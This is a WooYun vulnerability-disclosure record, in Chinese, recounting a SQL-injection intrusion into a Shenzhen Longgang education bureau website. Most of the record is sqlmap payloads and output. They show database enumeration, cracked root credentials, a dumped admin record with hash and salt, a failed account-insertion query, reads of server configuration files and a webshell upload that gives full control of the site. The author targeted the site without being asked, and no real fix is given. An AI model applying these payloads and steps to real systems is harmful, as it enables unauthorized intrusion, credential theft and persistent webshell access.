{"id": 27359, "wybug_id": "wooyun-2015-0125977", "wybug_title": "渗透测试之深圳龙岗教育网", "wybug_corp": "深圳市龙岗教育局", "wybug_author": "安全小飞侠", "wybug_date": "2015-07-11 08:57", "wybug_open_date": "2015-08-25 08:58", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路", "注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-08-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一个SQL注入引发的成功入侵内网事件...请叫我安全小飞侠，谢谢！ 详细说明：  最近写了个自动采集URL和扫描SQL注入的小脚本，想来看看有没有什么新发现。于是，有了下面的故事...某日下班回家，打开自己跑了几天脚本的服务器看看，心想改到收网的时候了。谁料结果并不如预期的那样，一条“大鱼”也没抓到，就在日志里发现了下面这个url：\nhttp://www.szlg.edu.cn/hudong.php?id=3144\n简单的手动测试了一下, 果然有SQL注入漏洞.\nhttp://www.szlg.edu.cn/hudong.php?id=3144' or 1=1\n\n\n于是乎，果断拿sqlmap跑一下，各种数据表尽现眼前，简单看了一下得有250+吧。而且还具有DBA的权限。\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: id=-7371 OR 6656=6656#    Type: error-based    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=1 OR (SELECT 2370 FROM(SELECT COUNT(*),CONCAT(0x71767a7071,(SELECT (ELT(2370=2370,1))),0x717a7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))GkhW)    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: id=1 UNION ALL SELECT CONCAT(0x71767a7071,0x71736979464a5a754149,0x717a7a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[17:24:18] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[17:24:18] [INFO] fetching database names[17:24:18] [INFO] the SQL query used returns 9 entries[17:24:18] [INFO] resumed: \"information_schema\"[17:24:18] [INFO] resumed: \"cdcol\"[17:24:18] [INFO] resumed: \"empirecms\"[17:24:18] [INFO] resumed: \"lgedusupervision\"[17:24:18] [INFO] resumed: \"lgjys\"[17:24:18] [INFO] resumed: \"mysql\"[17:24:18] [INFO] resumed: \"performance_schema\"[17:24:18] [INFO] resumed: \"phpmyadmin\"[17:24:18] [INFO] resumed: \"test\"available databases [9]:[*] cdcol[*] empirecms[*] information_schema[*] lgedusupervision[*] lgjys[*] mysql[*] performance_schema[*] phpmyadmin[*] test[17:25:21] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[17:25:21] [INFO] fetching current usercurrent user:    'root@localhost'[17:25:21] [INFO] fetching current databasecurrent database:    'empirecms'[17:25:21] [INFO] testing if current user is DBA[17:25:21] [INFO] fetching current usercurrent user is DBA:    True[18:04:19] [INFO] cracked password 'root' for user 'root'database management system users password hashes:[*] pma [1]:    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B    clear-text password: root[*] root [1]:    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B    clear-text password: root\n这里的显示有点奇怪（看着显示的是数据库），实际上这些都是Empirecms数据库下的表。\n\n习惯性地看看有没有什么敏感信息可以看见。\nDatabase: empirecmsTable: phome_enewsuser[22 columns]+------------+----------------------+| Column     | Type                 |+------------+----------------------+| addip      | varchar(20)          || addtime    | int(10) unsigned     || adminclass | mediumtext           || checked    | tinyint(1)           || classid    | smallint(5) unsigned || email      | varchar(120)         || filelevel  | tinyint(1)           || groupid    | smallint(5) unsigned || lastip     | varchar(20)          || lasttime   | int(10) unsigned     || loginnum   | int(10) unsigned     || password   | varchar(32)          || preip      | varchar(20)          || pretime    | int(10) unsigned     || rnd        | varchar(20)          || salt       | varchar(8)           || styleid    | smallint(5) unsigned || truename   | varchar(20)          || userid     | int(10) unsigned     || username   | varchar(30)          || userorg    | mediumtext           || userprikey | varchar(50)          |+------------+----------------------+Database: empirecms+-----------------+---------+| Table           | Entries |+-----------------+---------+| phome_enewsuser | 32      |+-----------------+---------+\n看看有没有管理员密码什么的登录一下后台。\n[17:34:32] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[17:34:32] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select * from phome_enewsuser where userid=1[17:35:11] [INFO] fetching SQL SELECT statement query output: 'select * from phome_enewsuser where userid=1'[17:35:11] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself[17:35:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns[17:35:11] [INFO] fetching current database[17:35:11] [INFO] fetching columns for table 'phome_enewsuser' in database 'empirecms'[17:35:11] [INFO] the SQL query used returns 22 entries[17:35:11] [INFO] the query with expanded column name(s) is: SELECT addip, addtime, adminclass, checked, classid, email, filelevel, groupid, lastip, lasttime, loginnum, password, preip, pretime, rnd, salt, styleid, truename, userid, username, userorg, userprikey FROM phome_enewsuser WHERE userid=1[17:35:11] [INFO] the SQL query used returns 1 entries[17:35:11] [INFO] retrieved: \"127.0.0.1\",\"1415617712\",\"|\",\"0\",\"0\",\"\",\"0\",\"1\",...select * from phome_enewsuser where userid=1 [1]:[*] 127.0.0.1, 1415617712, |, 0, 0, , 0, 1, 125.218.66.122, 1436497771, 494, 50407f6a9a8138749ac075b0decbb1d6, 125.218.66.122, 1436497708, GmAwTFUqjim8eCg28t7g, 8vYLFas4, 1, , 1, lgadmin, , HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH\n果然有，但是一看是加盐哈希存储的果断放弃了。。。于是乎，我在想既然破解不了密码，那我能不能通过insert增加一个管理员权限的账号呢。想到就干，但这时我注意到一个细节就是这个数据库的名字Empirecms和所有数据表的前缀phome_enews****， 有没有似曾相识的感觉？那还等什么，百度一下呗。\n\n看到没，就是它，“帝国网站管理系统”（好霸气的名字！！！）。看到这，不禁有点开心了，既然能知道源码和数据库结构那还不事半功倍了。 下载一个部署到虚机里部署一下，看看系统是怎么认证管理员的。在虚机里一番云雨，终于发现如下方法可以重置管理员密码。\n\n到这里，我似乎找到了印证我开始想法的办法了，那就是在虚机的系统上添加一个管理员账号，然后导出系统生成的salt，随机数，以及加密后的密码到这个系统上，我不就等于获得到了这个CMS系统管理员的权限了。于是，我兴高采烈地开始实验我的想法并开心地期待着成功的消息。\nweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[17:34:32] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select * from phome_enewsuser where userid=1[17:35:11] [INFO] fetching SQL SELECT statement query output: 'select * from phome_enewsuser where userid=1'[17:35:11] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself[17:35:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns[17:35:11] [INFO] fetching current database[17:35:11] [INFO] fetching columns for table 'phome_enewsuser' in database 'empirecms'[17:35:11] [INFO] the SQL query used returns 22 entries[17:35:11] [INFO] the query with expanded column name(s) is: SELECT addip, addtime, adminclass, checked, classid, email, filelevel, groupid, lastip, lasttime, loginnum, password, preip, pretime, rnd, salt, styleid, truename, userid, username, userorg, userprikey FROM phome_enewsuser WHERE userid=1[17:35:11] [INFO] the SQL query used returns 1 entries[17:35:11] [INFO] retrieved: \"127.0.0.1\",\"1415617712\",\"|\",\"0\",\"0\",\"\",\"0\",\"1\",...select * from phome_enewsuser where userid=1 [1]:[*] 127.0.0.1, 1415617712, |, 0, 0, , 0, 1, 125.218.66.122, 1436497771, 494, 50407f6a9a8138749ac075b0decbb1d6, 125.218.66.122, 1436497708, GmAwTFUqjim8eCg28t7g, 8vYLFas4, 1, , 1, lgadmin, , HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHsql-shell> insert into phome_enewsuser (addip, addtime, adminclass, checked, classid, email, filelevel, groupid, lastip, lasttime, loginnum, password, preip, pretime,rnd, salt, styleid, truename, userid, username, userorg, userprikey) values ('127.0.0.1', '1415617712', '|', 0, 0, , 0, 1, '125.218.66.122','1436497771',494, '50407f6a9a8138749ac075b0decbb1d6', '125.218.66.122', '1436497708, 'GmAwTFUqjim8eCg28t7g','8vYLFas4', 1, '', 33, 'lgadmin', '', 'HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH')[17:56:59] [WARNING] execution of custom SQL queries is only available when stacked queries are supportedsql-shell>\n然而，失败了！查了一下资料才知道（大牛勿喷），原来在此处不支持insert和update语句。好吧，此路也走不通了，难道就只能到这了吗？突然想到前面好像出现了一个很熟悉的数据库phpmyadmin而且还有获得到root的密码，要不试试？\n\n结果，再次失败了！前面获取到的账号和密码都无法登陆。怎么办呢？冷静下来，在分析分析，phpmyadmin+mysql+Apache+php,好熟悉的组合，难道是XAMPP部署的应用？那就来测试一下吧，先获取一个/opt/lampp/etc/php.ini看看吧\n[18:11:45] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[18:11:45] [INFO] fingerprinting the back-end DBMS operating system[18:11:45] [INFO] the back-end DBMS operating system is Linux[18:11:45] [INFO] fetching file: '/opt/lampp/etc/php.ini'do you want confirmation that the remote file '/opt/lampp/etc/php.ini' has beensuccessfully downloaded from the back-end DBMS file system? [Y/n] Y[18:11:48] [INFO] the local file C:\\Users\\hacker\\.sqlmap\\output\\www.szlg.edu.cn\\files\\_opt_lampp_etc_php.ini and the remote file /opt/lampp/etc/php.ini have the same size (69081b)files saved to [1]:[*] C:\\Users\\hacker\\.sqlmap\\output\\www.szlg.edu.cn\\files\\_opt_lampp_etc_php.ini(same file)\n\n\n看来果然是XAMPP部署的应用，那就好办了，现在只要找到网站的绝对路径就可以直接上传一个webshell拿下它了。顺利读取了/opt/lampp/etc/httpd.conf并找到了网站的绝对路径：/home/lgedu\n[18:17:08] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[18:17:08] [INFO] fingerprinting the back-end DBMS operating system[18:17:08] [INFO] the back-end DBMS operating system is Linux[18:17:08] [INFO] fetching file: '/opt/lampp/etc/httpd.conf'do you want confirmation that the remote file '/opt/lampp/etc/httpd.conf' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y[18:17:11] [INFO] the local file C:\\Users\\hacker\\.sqlmap\\output\\www.szlg.edu.cn\\files\\_opt_lampp_etc_httpd.conf and the remote file /opt/lampp/etc/httpd.conf have the same size (23342b)files saved to [1]:[*] C:\\Users\\hacker\\.sqlmap\\output\\www.szlg.edu.cn\\files\\_opt_lampp_etc_httpd.conf (same file)\n\n\n最后，上传一个webshell菜刀小连一下，网站终于被彻底拿下。\n[18:21:33] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[18:21:33] [INFO] fingerprinting the back-end DBMS operating system[18:21:33] [INFO] the back-end DBMS operating system is Linux[18:21:34] [WARNING] reflective value(s) found and filtering out[18:21:34] [WARNING] expect junk characters inside the file as a leftover from UNION querydo you want confirmation that the local file 'C:/Users/hacker/Desktop/wy.php' has been successfully written on the back-end DBMS file system (/home/lgedu/e/admin/view/key/wy.php)? [Y/n] Y[18:21:39] [INFO] the remote file /home/lgedu/e/admin/view/key/wy.php is larger(35b) than the local file C:/Users/hacker/Desktop/wy.php (28b)[18:21:39] [INFO] fetched data logged to text files under 'C:\\Users\\hacker\\.sqlmap\\output\\www.szlg.edu.cn'\n\n\n完...   漏洞证明：  \nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: id=-7371 OR 6656=6656#    Type: error-based    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=1 OR (SELECT 2370 FROM(SELECT COUNT(*),CONCAT(0x71767a7071,(SELECT (ELT(2370=2370,1))),0x717a7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))GkhW)    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: id=1 UNION ALL SELECT CONCAT(0x71767a7071,0x71736979464a5a754149,0x717a7a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[17:24:18] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[17:24:18] [INFO] fetching database names[17:24:18] [INFO] the SQL query used returns 9 entries[17:24:18] [INFO] resumed: \"information_schema\"[17:24:18] [INFO] resumed: \"cdcol\"[17:24:18] [INFO] resumed: \"empirecms\"[17:24:18] [INFO] resumed: \"lgedusupervision\"[17:24:18] [INFO] resumed: \"lgjys\"[17:24:18] [INFO] resumed: \"mysql\"[17:24:18] [INFO] resumed: \"performance_schema\"[17:24:18] [INFO] resumed: \"phpmyadmin\"[17:24:18] [INFO] resumed: \"test\"available databases [9]:[*] cdcol[*] empirecms[*] information_schema[*] lgedusupervision[*] lgjys[*] mysql[*] performance_schema[*] phpmyadmin[*] test[17:25:21] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[17:25:21] [INFO] fetching current usercurrent user:    'root@localhost'[17:25:21] [INFO] fetching current databasecurrent database:    'empirecms'[17:25:21] [INFO] testing if current user is DBA[17:25:21] [INFO] fetching current usercurrent user is DBA:    True[18:04:19] [INFO] cracked password 'root' for user 'root'database management system users password hashes:[*] pma [1]:    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B    clear-text password: root[*] root [1]:    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B    clear-text password: root\n\n[18:21:33] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.15, Apache 2.4.10back-end DBMS: MySQL 5.0[18:21:33] [INFO] fingerprinting the back-end DBMS operating system[18:21:33] [INFO] the back-end DBMS operating system is Linux[18:21:34] [WARNING] reflective value(s) found and filtering out[18:21:34] [WARNING] expect junk characters inside the file as a leftover from UNION querydo you want confirmation that the local file 'C:/Users/hacker/Desktop/wy.php' has been successfully written on the back-end DBMS file system (/home/lgedu/e/admin/view/key/wy.php)? [Y/n] Y[18:21:39] [INFO] the remote file /home/lgedu/e/admin/view/key/wy.php is larger(35b) than the local file C:/Users/hacker/Desktop/wy.php (28b)[18:21:39] [INFO] fetched data logged to text files under 'C:\\Users\\hacker\\.sqlmap\\output\\www.szlg.edu.cn'\n\n\n   修复方案：  你们懂的！   版权声明：转载请注明来源 安全小飞侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}